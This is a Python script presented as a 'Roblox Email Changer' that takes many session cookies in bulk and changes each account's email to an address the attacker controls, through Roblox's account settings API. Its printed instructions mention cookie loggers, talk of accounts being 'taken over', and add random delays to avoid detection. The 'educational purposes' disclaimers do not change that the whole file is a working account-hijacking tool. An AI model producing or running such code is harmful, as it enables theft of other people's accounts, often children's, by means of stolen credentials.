import sys
import subprocess

def check_and_install_dependencies():
    """
    Automatically check for and install required dependencies.
    """
    required_packages = ['requests']
    missing_packages = []
    
    for package in required_packages:
        try:
            __import__(package)
        except ImportError:
            missing_packages.append(package)
    
    if missing_packages:
        print("=" * 70)
        print("DEPENDENCY CHECK: Missing required packages")
        print("=" * 70)
        print(f"\n[!] Missing packages: {', '.join(missing_packages)}")
        print("[*] Attempting to install missing packages...\n")
        
        for package in missing_packages:
            try:
                print(f"[*] Installing {package}...")
                # Use sys.executable to ensure we install for the current Python interpreter
                subprocess.check_call([sys.executable, '-m', 'pip', 'install', package])
                print(f"[+] Successfully installed {package}")
            except subprocess.CalledProcessError:
                print(f"[-] Failed to install {package}")
                print(f"[!] Manual installation required:")
                print(f"[!] Run: pip install {package}")
                print(f"[!] Or: python -m pip install {package}")
                sys.exit(1)
            except Exception as e:
                print(f"[-] Error installing {package}: {e}")
                sys.exit(1)
        
        print("\n[+] All dependencies installed successfully\n")
        print("=" * 70)
        
        # Re-import after installation to verify
        for package in missing_packages:
            try:
                __import__(package)
            except ImportError:
                print(f"[-] Failed to import {package} after installation")
                sys.exit(1)

# Check dependencies before importing requests
check_and_install_dependencies()

# Now import requests (it should be installed)
import requests
import time
import random

# User-Agent: Fixed, consistent, and up-to-date
USER_AGENT = 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/121.0.0.0 Safari/537.36'

def change_email_with_cookie(cookie, new_email):
    """
    Roblox Email Changer - Uses cookie authentication to change account email.
    Creates a fresh session for every attempt to ensure isolation.
    """
    session = requests.Session()
    session.cookies['.ROBLOSESECURITY'] = cookie
    
    headers = {
        'User-Agent': USER_AGENT,
        'Referer': 'https://www.roblox.com/my/account'
    }

    # Step 1: Get a valid CSRF token
    try:
        # Roblox requires a GET request first to initialize the session and CSRF token
        r = session.get('https://accountsettings.roblox.com/v1/email', headers=headers)
        csrf_token = r.headers.get('X-CSRF-TOKEN')
        
        if not csrf_token:
            return False, "Failed to obtain CSRF token. Cookie invalid, expired, or IP blocked."
            
    except requests.exceptions.RequestException as e:
        return False, f"Network error: {str(e)}"
    except Exception as e:
        return False, f"Unexpected error: {str(e)}"

    # Step 2: Attempt to change the email
    payload = {'emailAddress': new_email}
    headers['X-CSRF-TOKEN'] = csrf_token
    headers['Content-Type'] = 'application/json'
    
    try:
        r = session.post(
            'https://accountsettings.roblox.com/v1/email',
            json=payload,
            headers=headers
        )
        
        if r.status_code == 200:
            return True, "Email change initiated. Verification code sent to the new email."
        elif r.status_code == 401:
            return False, "Unauthorized (401). Cookie is invalid or expired."
        elif r.status_code == 403:
            return False, "Forbidden (403). Roblox security blocked the request."
        elif r.status_code == 429:
            return False, "Rate Limited (429). Too many requests. Stopping to avoid ban."
        elif r.status_code == 400:
            return False, "Bad Request (400). Invalid email or target email banned."
        else:
            return False, f"Failed with status {r.status_code}."
            
    except requests.exceptions.RequestException as e:
        return False, f"Network error: {str(e)}"
    except Exception as e:
        return False, f"Unexpected error: {str(e)}"

def validate_cookie_format(cookie):
    """Basic validation for cookie structure"""
    if not cookie:
        return False
    if len(cookie) < 20:
        return False
    return True

def main():
    print("=" * 70)
    print("=== ROBLOX EMAIL CHANGER (MULTI-COOKIE) ===")
    print("=" * 70)
    print("\n[!] NOTE: Roblox does not allow email removal - only replacement.")
    print("[!] This tool changes account emails to one you control.")
    print("[!] Updated and Debugged for November 2026.\n")
    
    print("HOW TO USE:")
    print("1. Enter each .ROBLOSESECURITY cookie one per line.")
    print("2. When finished, type 'done' and press Enter.")
    print("3. Enter the target email address.")
    print("4. Tool will attempt to change email on all accounts.\n")
    
    print("HOW TO GET .ROBLOSESECURITY COOKIE:")
    print("- Open browser and go to roblox.com (logged in).")
    print("- Press F12 (Developer Tools).")
    print("- Go to 'Application' tab (Chrome) or 'Storage' tab (Firefox).")
    print("- Find 'Cookies' on left, click roblox.com.")
    print("- Copy the .ROBLOSESECURITY value.")
    print("- OR use a cookie logger you have set up.\n")
    
    print("WARNING:")
    print("- Only use cookies from accounts you own or have permission to test.")
    print("- Roblox may detect and ban accounts using this method.")
    print("- This tool does not bypass 2FA or email verification.")
    print("=" * 70)
    
    print("\nENTER COOKIES:")
    print("- One cookie per line.")
    print("- Type 'done' when finished.")
    print("- Invalid cookies will be skipped.\n")
    
    cookies = []
    
    while True:
        try:
            line = input()
            if line.lower() == 'done':
                break
            if line.strip():
                if validate_cookie_format(line.strip()):
                    cookies.append(line.strip())
                    print(f"[+] Cookie {len(cookies)} added successfully.")
                else:
                    print("[!] Warning: Cookie format invalid (too short). Skipped.")
        except KeyboardInterrupt:
            print("\n\n[!] Interrupted by user. Exiting.")
            sys.exit(1)
        except Exception as e:
            print(f"[!] Error reading input: {e}")
            continue
    
    if len(cookies) == 0:
        print("\n[-] No valid cookies entered. Exiting.")
        sys.exit(1)
    
    print(f"\n[+] {len(cookies)} valid cookies loaded.")
    
    # Get target email with robust validation
    new_email = ""
    while True:
        try:
            email_input = input("\nEnter target email address: ").strip()
            if '@' not in email_input:
                print("[-] Invalid email address - must contain '@'.")
                continue
            if '.' not in email_input.split('@')[1]:
                print("[-] Invalid email address - must have a valid domain with '.'.")
                continue
            new_email = email_input
            break # Exit loop only on valid input
        except KeyboardInterrupt:
            print("\n\n[!] Interrupted by user. Exiting.")
            sys.exit(1)
        except Exception as e:
            print(f"[!] Error reading email: {e}")
            continue
    
    print(f"\n[*] Target email: {new_email}")
    print("[!] WARNING: You must have access to this email inbox.")
    print("[!] Roblox will send verification codes to this address.")
    print("[!] Accounts are not fully taken over until verified.")
    print("\n[*] Starting batch process. This may take time due to safety delays.\n")
    
    success_count = 0
    failed_count = 0
    
    for i, cookie in enumerate(cookies, 1):
        print(f"[{i}/{len(cookies)}] Processing cookie {i}...")
        
        success, message = change_email_with_cookie(cookie, new_email)
        
        if success:
            print(f"[{i}/{len(cookies)}] [+] SUCCESS - {message}")
            success_count += 1
        else:
            print(f"[{i}/{len(cookies)}] [-] FAILED - {message}")
            failed_count += 1
        
        if i < len(cookies):
            delay = random.uniform(5, 10)
            print(f"[*] Waiting {delay:.1f} seconds before next attempt (safety delay)...")
            time.sleep(delay)
    
    print("\n" + "=" * 70)
    print("RESULTS:")
    print(f"Total valid cookies processed: {len(cookies)}")
    print(f"Successful changes: {success_count}")
    print(f"Failed attempts: {failed_count}")
    
    if success_count > 0:
        print(f"\n[!] {success_count} account(s) will require email verification.")
        print("[!] Check your email inbox for Roblox verification codes.")
        print("[!] Accounts are not fully taken over until verified.")
        print("[!] Roblox may send alerts to original email owners.")
    
    if failed_count > 0:
        print(f"\n[-] {failed_count} cookies were invalid, expired, or blocked.")
        print("[!] Common reasons:")
        print("   - Cookie expired (Roblox cookies expire after 30 days).")
        print("   - Account has 2FA enabled.")
        print("   - Roblox detected suspicious activity.")
        print("   - Account is under 13 (additional protections).")
    
    print("\n[!] DISCLAIMER:")
    print("[!] Use at your own risk - Roblox may ban accounts using this method.")
    print("[!] Only use on accounts you own or have explicit permission to test.")
    print("[!] This tool is for educational purposes only.")
    print("=" * 70)

if __name__ == "__main__":
    main()
